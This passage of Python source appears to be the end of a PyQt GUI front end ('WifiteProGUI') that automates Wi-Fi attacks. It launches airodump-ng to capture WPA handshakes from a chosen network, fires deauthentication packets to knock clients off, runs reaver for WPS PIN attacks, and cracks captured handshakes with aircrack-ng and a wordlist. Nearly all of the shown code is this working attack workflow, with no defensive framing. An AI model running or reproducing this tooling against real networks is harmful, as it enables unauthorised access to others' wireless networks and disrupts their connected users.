            self.log_message("🟢 Deauth Attack finished successfully (5 packets).")
        else:
            self.log_message("🔴 Deauth Attack failed or timed out.")

        self.stop_scan_btn.setEnabled(False) 
        self.start_scan_btn.setEnabled(True)
        self.save_result_to_file(command_str, status, output)
        self.insert_cli_prefix()

    def start_attack_automatic(self, attack_type):
        target_network = self.get_selected_target() 
        if not target_network: 
            self.log_message("❌ فشل بدء الهجوم: يجب تحديد شبكة.")
            return
        
        if not self.current_interface or not self.check_interface_existence(self.current_interface):
            self.log_message("❌ Error: Monitor IFACE is not set. Please use 'Set Monitor IFACE'.")
            return

        self.stop_all_processes(silent=True) 

        if attack_type == "WPA":
            essid = target_network['ESSID']
            bssid = target_network['BSSID']
            channel = target_network['Channel']
            
            self.log_message(f"--- بدء الهجوم التلقائي على {essid} (WPA) ---")
            
            base_filename = f"handshake-{essid}"
            handshake_dir_full = os.path.join(self.RESULT_COUNTER_DIR, self.HANDSHAKE_DIR)
            handshake_file = os.path.join(handshake_dir_full, base_filename)
            self.current_handshake_file = handshake_file
            
            attack_command = [
                'sudo', 'airodump-ng', 
                self.current_interface, 
                '--bssid', bssid, 
                '-c', channel, 
                '-w', handshake_file  
            ]
            
            self.log_message(f"بدء مراقبة التقاط Handshake. الملف: {handshake_file}-01.cap")
            
            self.worker = WorkerThread(attack_command, self.log_message, continuous=True, is_handshake_monitor=True)
            self.worker.output_signal.connect(self.log_message)
            self.worker.finished.connect(self._attack_finished)
            self.worker.handshake_monitor_started.connect(self.trigger_automatic_deauth)
            self.worker.start()
            
            self.start_scan_btn.setEnabled(False)
            self.stop_scan_btn.setEnabled(True)

        elif attack_type == "WPS":
            essid = target_network['ESSID']
            bssid = target_network['BSSID']
            
            self.log_message(f"--- بدء هجوم WPS Reaver على {essid} ---")

            reaver_command = [
                'sudo', 'reaver', 
                '-i', self.current_interface, 
                '-b', bssid, 
                '-vv' 
            ]
            
            self.worker = WorkerThread(reaver_command, self.log_message, continuous=True)
            self.worker.output_signal.connect(self.log_message)
            self.worker.finished.connect(self._attack_finished)
            self.worker.start()
            
            self.start_scan_btn.setEnabled(False)
            self.stop_scan_btn.setEnabled(True)

    def trigger_automatic_deauth(self, monitor_info):
        target_network = self.get_selected_target() 
        bssid = target_network['BSSID']
        essid = target_network['ESSID']

        self.log_message("Triggering Deauth (5 packets) to force handshake...")
        self.deauth_worker = DeauthWorker(self.current_interface, bssid, self.log_message)
        self.deauth_worker.finished.connect(self._deauth_finished_auto)
        self.deauth_worker.start()

    def _deauth_finished_auto(self, status, output, command_str):
        self.log_message(output)
        if status == "SUCCESS":
            self.log_message("🟢 Deauth completed. Waiting for Handshake...")
        else:
            self.log_message("🔴 Deauth failed. Continuing handshake monitor...")
            
    def _attack_finished(self, status, output, command_str):
        self.log_message(output)
        
        if status == "ERROR":
            self.log_message("🔴 Attack finished with an error.")
        else:
            self.log_message("🟢 Attack thread stopped.")

        self.stop_scan_btn.setEnabled(False)
        self.start_scan_btn.setEnabled(True)
        self.save_result_to_file(command_str, status, output)
        
        if self.current_handshake_file:
             self.log_message(f"Checking validity of Handshake files created by: {self.current_handshake_file}")
             self.check_handshake_validity(self.current_handshake_file)
             self.current_handshake_file = None

        self.insert_cli_prefix()

    def check_handshake_validity(self, base_filename):
        search_dir = os.path.join(self.RESULT_COUNTER_DIR, self.HANDSHAKE_DIR)
        
        base_name_only = os.path.basename(base_filename)
        
        cap_files = [f for f in os.listdir(search_dir) if f.startswith(base_name_only) and f.endswith('.cap')]
        
        if not cap_files:
            self.log_message("🔴 No capture (.cap) files found in the directory.")
            return

        for cap_file in cap_files:
            full_cap_path = os.path.join(search_dir, cap_file)
            
            check_command = ['aircrack-ng', '-j', '/dev/null', full_cap_path] 
            
            try:
                process = subprocess.run(check_command, capture_output=True, text=True, timeout=5)
                
                if re.search(r'WPA handshake:.*(1)', process.stdout):
                    self.log_message(f"🟢 **Handshake captured!** File: **{cap_file}**")
                    return
                
            except Exception as e:
                self.log_message(f"❌ Error during aircrack-ng check: {e}")
                
        self.log_message("🔴 Warning: Aircrack-ng did not confirm any valid handshake in the capture file(s).")
        
    def crack_handshake(self):
        self.log_message("--- بدء فك تشفير Handshake ---")
        
        file_dialog = QFileDialog()
        file_dialog.setWindowTitle("Select Handshake (.cap) File")
        file_dialog.setNameFilter("Capture Files (*.cap)")
        file_dialog.setDirectory(os.path.join(os.getcwd(), self.RESULT_COUNTER_DIR, self.HANDSHAKE_DIR))

        if file_dialog.exec() == QFileDialog.DialogCode.Accepted:
            cap_file = file_dialog.selectedFiles()[0]
            
            wordlist_dialog = QFileDialog()
            wordlist_dialog.setWindowTitle("Select Wordlist (.txt) File")
            wordlist_dialog.setNameFilter("Wordlist Files (*.txt)")

            if wordlist_dialog.exec() == QFileDialog.DialogCode.Accepted:
                wordlist_file = wordlist_dialog.selectedFiles()[0]
                
                self.log_message(f"Selected CAP: **{cap_file}**")
                self.log_message(f"Selected Wordlist: **{wordlist_file}**")
                
                crack_command = ['sudo', 'aircrack-ng', '-a', '2', '-w', wordlist_file, cap_file]
                
                self.log_message("Starting Aircrack-ng (WPA Handshake cracking)...")
                
                self.worker = WorkerThread(crack_command, self.log_message, continuous=True)
                self.worker.output_signal.connect(self.log_message)
                self.worker.finished.connect(self._attack_finished)
                self.worker.start()

    def check_interface_existence(self, iface_name):
        try:
            # التحقق البسيط باستخدام iwconfig
            subprocess.run(['iwconfig', iface_name], check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def stop_all_processes(self, silent=False):
        if self.timer and self.timer.isActive():
            self.timer.stop()
        
        if self.worker and self.worker.isRunning():
            self.worker.terminate()
            self.worker.wait()
            if not silent: self.log_message("🛑 Active worker terminated.")

        if self.deauth_worker and self.deauth_worker.isRunning():
            self.deauth_worker.terminate()
            self.deauth_worker.wait()
            if not silent: self.log_message("🛑 Active deauth worker terminated.")
            
        self.stop_scan_btn.setEnabled(False)
        if not self.terminal_active: self.start_scan_btn.setEnabled(True)

    def show_error_popup(self):
        msg = QMessageBox()
        msg.setWindowTitle("Error Details")
        msg.setText("This feature would normally display detailed error logs or debugging output here.")
        msg.exec()

    def exit_application(self):
        self.stop_all_processes(silent=True)
        QApplication.quit()


if __name__ == '__main__':
    
    GIF_FILENAME = "pirate_hacker_background.gif"
    create_startup_gif(GIF_FILENAME) 
        
    app = QApplication(sys.argv)
    
    splash = AnimatedSplashScreen(
        gif_path=GIF_FILENAME,
        duration_ms=5000 
    )
    splash.show()
    
    window = WifiteProGUI()
    
    splash.start_timer(window)
    
    sys.exit(app.exec())
